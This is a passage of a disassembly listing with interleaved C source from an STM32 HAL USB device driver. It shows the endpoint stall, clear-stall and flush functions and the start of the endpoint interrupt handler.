 80023fa:	429a      	cmp	r2, r3
 80023fc:	d901      	bls.n	8002402 <HAL_PCD_EP_SetStall+0x1e>
  {
    return HAL_ERROR;
 80023fe:	2301      	movs	r3, #1
 8002400:	e04c      	b.n	800249c <HAL_PCD_EP_SetStall+0xb8>
  }

  if ((0x80U & ep_addr) == 0x80U)
 8002402:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002406:	2b00      	cmp	r3, #0
 8002408:	da0e      	bge.n	8002428 <HAL_PCD_EP_SetStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800240a:	78fb      	ldrb	r3, [r7, #3]
 800240c:	f003 0307 	and.w	r3, r3, #7
 8002410:	1c5a      	adds	r2, r3, #1
 8002412:	4613      	mov	r3, r2
 8002414:	009b      	lsls	r3, r3, #2
 8002416:	4413      	add	r3, r2
 8002418:	00db      	lsls	r3, r3, #3
 800241a:	687a      	ldr	r2, [r7, #4]
 800241c:	4413      	add	r3, r2
 800241e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002420:	68fb      	ldr	r3, [r7, #12]
 8002422:	2201      	movs	r2, #1
 8002424:	705a      	strb	r2, [r3, #1]
 8002426:	e00c      	b.n	8002442 <HAL_PCD_EP_SetStall+0x5e>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 8002428:	78fa      	ldrb	r2, [r7, #3]
 800242a:	4613      	mov	r3, r2
 800242c:	009b      	lsls	r3, r3, #2
 800242e:	4413      	add	r3, r2
 8002430:	00db      	lsls	r3, r3, #3
 8002432:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002436:	687a      	ldr	r2, [r7, #4]
 8002438:	4413      	add	r3, r2
 800243a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 800243c:	68fb      	ldr	r3, [r7, #12]
 800243e:	2200      	movs	r2, #0
 8002440:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 1U;
 8002442:	68fb      	ldr	r3, [r7, #12]
 8002444:	2201      	movs	r2, #1
 8002446:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002448:	78fb      	ldrb	r3, [r7, #3]
 800244a:	f003 0307 	and.w	r3, r3, #7
 800244e:	b2da      	uxtb	r2, r3
 8002450:	68fb      	ldr	r3, [r7, #12]
 8002452:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002454:	687b      	ldr	r3, [r7, #4]
 8002456:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800245a:	2b01      	cmp	r3, #1
 800245c:	d101      	bne.n	8002462 <HAL_PCD_EP_SetStall+0x7e>
 800245e:	2302      	movs	r3, #2
 8002460:	e01c      	b.n	800249c <HAL_PCD_EP_SetStall+0xb8>
 8002462:	687b      	ldr	r3, [r7, #4]
 8002464:	2201      	movs	r2, #1
 8002466:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  (void)USB_EPSetStall(hpcd->Instance, ep);
 800246a:	687b      	ldr	r3, [r7, #4]
 800246c:	681b      	ldr	r3, [r3, #0]
 800246e:	68f9      	ldr	r1, [r7, #12]
 8002470:	4618      	mov	r0, r3
 8002472:	f005 febb 	bl	80081ec <USB_EPSetStall>

  if ((ep_addr & EP_ADDR_MSK) == 0U)
 8002476:	78fb      	ldrb	r3, [r7, #3]
 8002478:	f003 0307 	and.w	r3, r3, #7
 800247c:	2b00      	cmp	r3, #0
 800247e:	d108      	bne.n	8002492 <HAL_PCD_EP_SetStall+0xae>
  {
    (void)USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);
 8002480:	687b      	ldr	r3, [r7, #4]
 8002482:	681a      	ldr	r2, [r3, #0]
 8002484:	687b      	ldr	r3, [r7, #4]
 8002486:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800248a:	4619      	mov	r1, r3
 800248c:	4610      	mov	r0, r2
 800248e:	f005 fffc 	bl	800848a <USB_EP0_OutStart>
  }

  __HAL_UNLOCK(hpcd);
 8002492:	687b      	ldr	r3, [r7, #4]
 8002494:	2200      	movs	r2, #0
 8002496:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800249a:	2300      	movs	r3, #0
}
 800249c:	4618      	mov	r0, r3
 800249e:	3710      	adds	r7, #16
 80024a0:	46bd      	mov	sp, r7
 80024a2:	bd80      	pop	{r7, pc}

080024a4 <HAL_PCD_EP_ClrStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80024a4:	b580      	push	{r7, lr}
 80024a6:	b084      	sub	sp, #16
 80024a8:	af00      	add	r7, sp, #0
 80024aa:	6078      	str	r0, [r7, #4]
 80024ac:	460b      	mov	r3, r1
 80024ae:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & 0x0FU) > hpcd->Init.dev_endpoints)
 80024b0:	78fb      	ldrb	r3, [r7, #3]
 80024b2:	f003 020f 	and.w	r2, r3, #15
 80024b6:	687b      	ldr	r3, [r7, #4]
 80024b8:	685b      	ldr	r3, [r3, #4]
 80024ba:	429a      	cmp	r2, r3
 80024bc:	d901      	bls.n	80024c2 <HAL_PCD_EP_ClrStall+0x1e>
  {
    return HAL_ERROR;
 80024be:	2301      	movs	r3, #1
 80024c0:	e040      	b.n	8002544 <HAL_PCD_EP_ClrStall+0xa0>
  }

  if ((0x80U & ep_addr) == 0x80U)
 80024c2:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80024c6:	2b00      	cmp	r3, #0
 80024c8:	da0e      	bge.n	80024e8 <HAL_PCD_EP_ClrStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80024ca:	78fb      	ldrb	r3, [r7, #3]
 80024cc:	f003 0307 	and.w	r3, r3, #7
 80024d0:	1c5a      	adds	r2, r3, #1
 80024d2:	4613      	mov	r3, r2
 80024d4:	009b      	lsls	r3, r3, #2
 80024d6:	4413      	add	r3, r2
 80024d8:	00db      	lsls	r3, r3, #3
 80024da:	687a      	ldr	r2, [r7, #4]
 80024dc:	4413      	add	r3, r2
 80024de:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80024e0:	68fb      	ldr	r3, [r7, #12]
 80024e2:	2201      	movs	r2, #1
 80024e4:	705a      	strb	r2, [r3, #1]
 80024e6:	e00e      	b.n	8002506 <HAL_PCD_EP_ClrStall+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80024e8:	78fb      	ldrb	r3, [r7, #3]
 80024ea:	f003 0207 	and.w	r2, r3, #7
 80024ee:	4613      	mov	r3, r2
 80024f0:	009b      	lsls	r3, r3, #2
 80024f2:	4413      	add	r3, r2
 80024f4:	00db      	lsls	r3, r3, #3
 80024f6:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80024fa:	687a      	ldr	r2, [r7, #4]
 80024fc:	4413      	add	r3, r2
 80024fe:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002500:	68fb      	ldr	r3, [r7, #12]
 8002502:	2200      	movs	r2, #0
 8002504:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 0U;
 8002506:	68fb      	ldr	r3, [r7, #12]
 8002508:	2200      	movs	r2, #0
 800250a:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 800250c:	78fb      	ldrb	r3, [r7, #3]
 800250e:	f003 0307 	and.w	r3, r3, #7
 8002512:	b2da      	uxtb	r2, r3
 8002514:	68fb      	ldr	r3, [r7, #12]
 8002516:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002518:	687b      	ldr	r3, [r7, #4]
 800251a:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800251e:	2b01      	cmp	r3, #1
 8002520:	d101      	bne.n	8002526 <HAL_PCD_EP_ClrStall+0x82>
 8002522:	2302      	movs	r3, #2
 8002524:	e00e      	b.n	8002544 <HAL_PCD_EP_ClrStall+0xa0>
 8002526:	687b      	ldr	r3, [r7, #4]
 8002528:	2201      	movs	r2, #1
 800252a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_EPClearStall(hpcd->Instance, ep);
 800252e:	687b      	ldr	r3, [r7, #4]
 8002530:	681b      	ldr	r3, [r3, #0]
 8002532:	68f9      	ldr	r1, [r7, #12]
 8002534:	4618      	mov	r0, r3
 8002536:	f005 feaa 	bl	800828e <USB_EPClearStall>
  __HAL_UNLOCK(hpcd);
 800253a:	687b      	ldr	r3, [r7, #4]
 800253c:	2200      	movs	r2, #0
 800253e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002542:	2300      	movs	r3, #0
}
 8002544:	4618      	mov	r0, r3
 8002546:	3710      	adds	r7, #16
 8002548:	46bd      	mov	sp, r7
 800254a:	bd80      	pop	{r7, pc}

0800254c <HAL_PCD_EP_Flush>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 800254c:	b580      	push	{r7, lr}
 800254e:	b082      	sub	sp, #8
 8002550:	af00      	add	r7, sp, #0
 8002552:	6078      	str	r0, [r7, #4]
 8002554:	460b      	mov	r3, r1
 8002556:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 8002558:	687b      	ldr	r3, [r7, #4]
 800255a:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800255e:	2b01      	cmp	r3, #1
 8002560:	d101      	bne.n	8002566 <HAL_PCD_EP_Flush+0x1a>
 8002562:	2302      	movs	r3, #2
 8002564:	e01b      	b.n	800259e <HAL_PCD_EP_Flush+0x52>
 8002566:	687b      	ldr	r3, [r7, #4]
 8002568:	2201      	movs	r2, #1
 800256a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  if ((ep_addr & 0x80U) == 0x80U)
 800256e:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002572:	2b00      	cmp	r3, #0
 8002574:	da09      	bge.n	800258a <HAL_PCD_EP_Flush+0x3e>
  {
    (void)USB_FlushTxFifo(hpcd->Instance, (uint32_t)ep_addr & EP_ADDR_MSK);
 8002576:	687b      	ldr	r3, [r7, #4]
 8002578:	681a      	ldr	r2, [r3, #0]
 800257a:	78fb      	ldrb	r3, [r7, #3]
 800257c:	f003 0307 	and.w	r3, r3, #7
 8002580:	4619      	mov	r1, r3
 8002582:	4610      	mov	r0, r2
 8002584:	f003 fcb8 	bl	8005ef8 <USB_FlushTxFifo>
 8002588:	e004      	b.n	8002594 <HAL_PCD_EP_Flush+0x48>
  }
  else
  {
    (void)USB_FlushRxFifo(hpcd->Instance);
 800258a:	687b      	ldr	r3, [r7, #4]
 800258c:	681b      	ldr	r3, [r3, #0]
 800258e:	4618      	mov	r0, r3
 8002590:	f003 fcbe 	bl	8005f10 <USB_FlushRxFifo>
  }

  __HAL_UNLOCK(hpcd);
 8002594:	687b      	ldr	r3, [r7, #4]
 8002596:	2200      	movs	r2, #0
 8002598:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800259c:	2300      	movs	r3, #0
}
 800259e:	4618      	mov	r0, r3
 80025a0:	3708      	adds	r7, #8
 80025a2:	46bd      	mov	sp, r7
 80025a4:	bd80      	pop	{r7, pc}

080025a6 <PCD_EP_ISR_Handler>:
  * @brief  This function handles PCD Endpoint interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)
{
 80025a6:	b580      	push	{r7, lr}
 80025a8:	b096      	sub	sp, #88	; 0x58
 80025aa:	af00      	add	r7, sp, #0
 80025ac:	6078      	str	r0, [r7, #4]
#if (USE_USB_DOUBLE_BUFFER != 1U)
  count = 0U;
#endif /* USE_USB_DOUBLE_BUFFER */

  /* stay in loop while pending interrupts */
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 80025ae:	e3b1      	b.n	8002d14 <PCD_EP_ISR_Handler+0x76e>
  {
    wIstr = hpcd->Instance->ISTR;
 80025b0:	687b      	ldr	r3, [r7, #4]
 80025b2:	681b      	ldr	r3, [r3, #0]
 80025b4:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80025b8:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e

    /* extract highest priority endpoint number */
    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);
 80025bc:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80025c0:	b2db      	uxtb	r3, r3
 80025c2:	f003 030f 	and.w	r3, r3, #15
 80025c6:	f887 304d 	strb.w	r3, [r7, #77]	; 0x4d

    if (epindex == 0U)
 80025ca:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80025ce:	2b00      	cmp	r3, #0
 80025d0:	f040 8173 	bne.w	80028ba <PCD_EP_ISR_Handler+0x314>
    {
      /* Decode and service control endpoint interrupt */

      /* DIR bit = origin of the interrupt */
      if ((wIstr & USB_ISTR_DIR) == 0U)
 80025d4:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80025d8:	f003 0310 	and.w	r3, r3, #16
 80025dc:	2b00      	cmp	r3, #0
 80025de:	d150      	bne.n	8002682 <PCD_EP_ISR_Handler+0xdc>
      {
        /* DIR = 0 */

        /* DIR = 0 => IN  int */
        /* DIR = 0 implies that (EP_CTR_TX = 1) always */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 80025e0:	687b      	ldr	r3, [r7, #4]
 80025e2:	681b      	ldr	r3, [r3, #0]
 80025e4:	881b      	ldrh	r3, [r3, #0]
 80025e6:	b29b      	uxth	r3, r3
 80025e8:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 80025ec:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80025f0:	81fb      	strh	r3, [r7, #14]
 80025f2:	687b      	ldr	r3, [r7, #4]
 80025f4:	681a      	ldr	r2, [r3, #0]
 80025f6:	89fb      	ldrh	r3, [r7, #14]
 80025f8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80025fc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002600:	b29b      	uxth	r3, r3
 8002602:	8013      	strh	r3, [r2, #0]
        ep = &hpcd->IN_ep[0];
 8002604:	687b      	ldr	r3, [r7, #4]
 8002606:	3328      	adds	r3, #40	; 0x28
 8002608:	657b      	str	r3, [r7, #84]	; 0x54

        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 800260a:	687b      	ldr	r3, [r7, #4]
 800260c:	681b      	ldr	r3, [r3, #0]
 800260e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002612:	b29b      	uxth	r3, r3
 8002614:	461a      	mov	r2, r3
 8002616:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002618:	781b      	ldrb	r3, [r3, #0]
 800261a:	00db      	lsls	r3, r3, #3
 800261c:	4413      	add	r3, r2
 800261e:	687a      	ldr	r2, [r7, #4]
 8002620:	6812      	ldr	r2, [r2, #0]
 8002622:	4413      	add	r3, r2
 8002624:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002628:	881b      	ldrh	r3, [r3, #0]
 800262a:	f3c3 0209 	ubfx	r2, r3, #0, #10
 800262e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002630:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += ep->xfer_count;
 8002632:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002634:	695a      	ldr	r2, [r3, #20]
 8002636:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002638:	69db      	ldr	r3, [r3, #28]
 800263a:	441a      	add	r2, r3
 800263c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800263e:	615a      	str	r2, [r3, #20]

        /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
        hpcd->DataInStageCallback(hpcd, 0U);
#else
        HAL_PCD_DataInStageCallback(hpcd, 0U);
 8002640:	2100      	movs	r1, #0
 8002642:	6878      	ldr	r0, [r7, #4]
 8002644:	f00a f98f 	bl	800c966 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

        if ((hpcd->USB_Address > 0U) && (ep->xfer_len == 0U))
 8002648:	687b      	ldr	r3, [r7, #4]
 800264a:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 800264e:	b2db      	uxtb	r3, r3
 8002650:	2b00      	cmp	r3, #0
 8002652:	f000 835f 	beq.w	8002d14 <PCD_EP_ISR_Handler+0x76e>
 8002656:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002658:	699b      	ldr	r3, [r3, #24]
 800265a:	2b00      	cmp	r3, #0
 800265c:	f040 835a 	bne.w	8002d14 <PCD_EP_ISR_Handler+0x76e>
        {
          hpcd->Instance->DADDR = ((uint16_t)hpcd->USB_Address | USB_DADDR_EF);
 8002660:	687b      	ldr	r3, [r7, #4]
 8002662:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8002666:	b2db      	uxtb	r3, r3
 8002668:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800266c:	b2da      	uxtb	r2, r3
 800266e:	687b      	ldr	r3, [r7, #4]
 8002670:	681b      	ldr	r3, [r3, #0]
 8002672:	b292      	uxth	r2, r2
 8002674:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
          hpcd->USB_Address = 0U;
 8002678:	687b      	ldr	r3, [r7, #4]
 800267a:	2200      	movs	r2, #0
 800267c:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8002680:	e348      	b.n	8002d14 <PCD_EP_ISR_Handler+0x76e>
      {
        /* DIR = 1 */

        /* DIR = 1 & CTR_RX => SETUP or OUT int */
        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */
        ep = &hpcd->OUT_ep[0];
 8002682:	687b      	ldr	r3, [r7, #4]
 8002684:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002688:	657b      	str	r3, [r7, #84]	; 0x54
        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 800268a:	687b      	ldr	r3, [r7, #4]
 800268c:	681b      	ldr	r3, [r3, #0]
 800268e:	881b      	ldrh	r3, [r3, #0]
 8002690:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

        if ((wEPVal & USB_EP_SETUP) != 0U)
 8002694:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002698:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 800269c:	2b00      	cmp	r3, #0
 800269e:	d032      	beq.n	8002706 <PCD_EP_ISR_Handler+0x160>
        {
          /* Get SETUP Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 80026a0:	687b      	ldr	r3, [r7, #4]
 80026a2:	681b      	ldr	r3, [r3, #0]
 80026a4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80026a8:	b29b      	uxth	r3, r3
 80026aa:	461a      	mov	r2, r3
 80026ac:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026ae:	781b      	ldrb	r3, [r3, #0]
 80026b0:	00db      	lsls	r3, r3, #3
 80026b2:	4413      	add	r3, r2
 80026b4:	687a      	ldr	r2, [r7, #4]
 80026b6:	6812      	ldr	r2, [r2, #0]
 80026b8:	4413      	add	r3, r2
 80026ba:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80026be:	881b      	ldrh	r3, [r3, #0]
 80026c0:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80026c4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026c6:	61da      	str	r2, [r3, #28]

          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 80026c8:	687b      	ldr	r3, [r7, #4]
 80026ca:	6818      	ldr	r0, [r3, #0]
 80026cc:	687b      	ldr	r3, [r7, #4]
 80026ce:	f503 712c 	add.w	r1, r3, #688	; 0x2b0
 80026d2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026d4:	88da      	ldrh	r2, [r3, #6]
                      ep->pmaadress, (uint16_t)ep->xfer_count);
 80026d6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026d8:	69db      	ldr	r3, [r3, #28]
          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 80026da:	b29b      	uxth	r3, r3
 80026dc:	f005 ff23 	bl	8008526 <USB_ReadPMA>

          /* SETUP bit kept frozen while CTR_RX = 1 */
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 80026e0:	687b      	ldr	r3, [r7, #4]
 80026e2:	681b      	ldr	r3, [r3, #0]
 80026e4:	881b      	ldrh	r3, [r3, #0]
 80026e6:	b29a      	uxth	r2, r3
 80026e8:	f640 738f 	movw	r3, #3983	; 0xf8f
 80026ec:	4013      	ands	r3, r2
 80026ee:	823b      	strh	r3, [r7, #16]
 80026f0:	687b      	ldr	r3, [r7, #4]
 80026f2:	681b      	ldr	r3, [r3, #0]
 80026f4:	8a3a      	ldrh	r2, [r7, #16]
 80026f6:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 80026fa:	b292      	uxth	r2, r2
 80026fc:	801a      	strh	r2, [r3, #0]

          /* Process SETUP Packet*/
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->SetupStageCallback(hpcd);
#else
          HAL_PCD_SetupStageCallback(hpcd);
 80026fe:	6878      	ldr	r0, [r7, #4]
 8002700:	f00a f904 	bl	800c90c <HAL_PCD_SetupStageCallback>
 8002704:	e306      	b.n	8002d14 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else if ((wEPVal & USB_EP_CTR_RX) != 0U)
 8002706:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 800270a:	2b00      	cmp	r3, #0
 800270c:	f280 8302 	bge.w	8002d14 <PCD_EP_ISR_Handler+0x76e>
        {
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002710:	687b      	ldr	r3, [r7, #4]
 8002712:	681b      	ldr	r3, [r3, #0]
 8002714:	881b      	ldrh	r3, [r3, #0]
 8002716:	b29a      	uxth	r2, r3
 8002718:	f640 738f 	movw	r3, #3983	; 0xf8f
 800271c:	4013      	ands	r3, r2
 800271e:	83fb      	strh	r3, [r7, #30]
 8002720:	687b      	ldr	r3, [r7, #4]
 8002722:	681b      	ldr	r3, [r3, #0]
 8002724:	8bfa      	ldrh	r2, [r7, #30]
 8002726:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800272a:	b292      	uxth	r2, r2
 800272c:	801a      	strh	r2, [r3, #0]

          /* Get Control Data OUT Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 800272e:	687b      	ldr	r3, [r7, #4]
 8002730:	681b      	ldr	r3, [r3, #0]
 8002732:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002736:	b29b      	uxth	r3, r3
 8002738:	461a      	mov	r2, r3
 800273a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800273c:	781b      	ldrb	r3, [r3, #0]
 800273e:	00db      	lsls	r3, r3, #3
 8002740:	4413      	add	r3, r2
 8002742:	687a      	ldr	r2, [r7, #4]
 8002744:	6812      	ldr	r2, [r2, #0]
 8002746:	4413      	add	r3, r2
 8002748:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800274c:	881b      	ldrh	r3, [r3, #0]
 800274e:	f3c3 0209 	ubfx	r2, r3, #0, #10
 8002752:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002754:	61da      	str	r2, [r3, #28]

          if ((ep->xfer_count != 0U) && (ep->xfer_buff != 0U))
 8002756:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002758:	69db      	ldr	r3, [r3, #28]
 800275a:	2b00      	cmp	r3, #0
 800275c:	d019      	beq.n	8002792 <PCD_EP_ISR_Handler+0x1ec>
 800275e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002760:	695b      	ldr	r3, [r3, #20]
 8002762:	2b00      	cmp	r3, #0
 8002764:	d015      	beq.n	8002792 <PCD_EP_ISR_Handler+0x1ec>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 8002766:	687b      	ldr	r3, [r7, #4]
 8002768:	6818      	ldr	r0, [r3, #0]
 800276a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800276c:	6959      	ldr	r1, [r3, #20]
 800276e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002770:	88da      	ldrh	r2, [r3, #6]
                        ep->pmaadress, (uint16_t)ep->xfer_count);
 8002772:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002774:	69db      	ldr	r3, [r3, #28]
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 8002776:	b29b      	uxth	r3, r3
 8002778:	f005 fed5 	bl	8008526 <USB_ReadPMA>

            ep->xfer_buff += ep->xfer_count;
 800277c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800277e:	695a      	ldr	r2, [r3, #20]
 8002780:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002782:	69db      	ldr	r3, [r3, #28]
 8002784:	441a      	add	r2, r3
 8002786:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002788:	615a      	str	r2, [r3, #20]

            /* Process Control Data OUT Packet */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
            hpcd->DataOutStageCallback(hpcd, 0U);
#else
            HAL_PCD_DataOutStageCallback(hpcd, 0U);
 800278a:	2100      	movs	r1, #0
 800278c:	6878      	ldr	r0, [r7, #4]
 800278e:	f00a f8cf 	bl	800c930 <HAL_PCD_DataOutStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
          }

          wEPVal = (uint16_t)PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 8002792:	687b      	ldr	r3, [r7, #4]
 8002794:	681b      	ldr	r3, [r3, #0]
 8002796:	881b      	ldrh	r3, [r3, #0]
 8002798:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

          if (((wEPVal & USB_EP_SETUP) == 0U) && ((wEPVal & USB_EP_RX_STRX) != USB_EP_RX_VALID))
 800279c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 80027a0:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 80027a4:	2b00      	cmp	r3, #0
 80027a6:	f040 82b5 	bne.w	8002d14 <PCD_EP_ISR_Handler+0x76e>
 80027aa:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 80027ae:	f403 5340 	and.w	r3, r3, #12288	; 0x3000
 80027b2:	f5b3 5f40 	cmp.w	r3, #12288	; 0x3000
 80027b6:	f000 82ad 	beq.w	8002d14 <PCD_EP_ISR_Handler+0x76e>
          {
            PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);
 80027ba:	687b      	ldr	r3, [r7, #4]
 80027bc:	681b      	ldr	r3, [r3, #0]
 80027be:	61bb      	str	r3, [r7, #24]
 80027c0:	687b      	ldr	r3, [r7, #4]
 80027c2:	681b      	ldr	r3, [r3, #0]
 80027c4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80027c8:	b29b      	uxth	r3, r3
 80027ca:	461a      	mov	r2, r3
 80027cc:	69bb      	ldr	r3, [r7, #24]
 80027ce:	4413      	add	r3, r2
 80027d0:	61bb      	str	r3, [r7, #24]
 80027d2:	69bb      	ldr	r3, [r7, #24]
 80027d4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80027d8:	617b      	str	r3, [r7, #20]
 80027da:	697b      	ldr	r3, [r7, #20]
 80027dc:	881b      	ldrh	r3, [r3, #0]
 80027de:	b29b      	uxth	r3, r3
 80027e0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80027e4:	b29a      	uxth	r2, r3
 80027e6:	697b      	ldr	r3, [r7, #20]
 80027e8:	801a      	strh	r2, [r3, #0]
 80027ea:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027ec:	691b      	ldr	r3, [r3, #16]
 80027ee:	2b3e      	cmp	r3, #62	; 0x3e
 80027f0:	d91d      	bls.n	800282e <PCD_EP_ISR_Handler+0x288>
 80027f2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027f4:	691b      	ldr	r3, [r3, #16]
 80027f6:	095b      	lsrs	r3, r3, #5
 80027f8:	647b      	str	r3, [r7, #68]	; 0x44
 80027fa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027fc:	691b      	ldr	r3, [r3, #16]
 80027fe:	f003 031f 	and.w	r3, r3, #31
 8002802:	2b00      	cmp	r3, #0
 8002804:	d102      	bne.n	800280c <PCD_EP_ISR_Handler+0x266>
 8002806:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002808:	3b01      	subs	r3, #1
 800280a:	647b      	str	r3, [r7, #68]	; 0x44
 800280c:	697b      	ldr	r3, [r7, #20]
 800280e:	881b      	ldrh	r3, [r3, #0]
 8002810:	b29a      	uxth	r2, r3
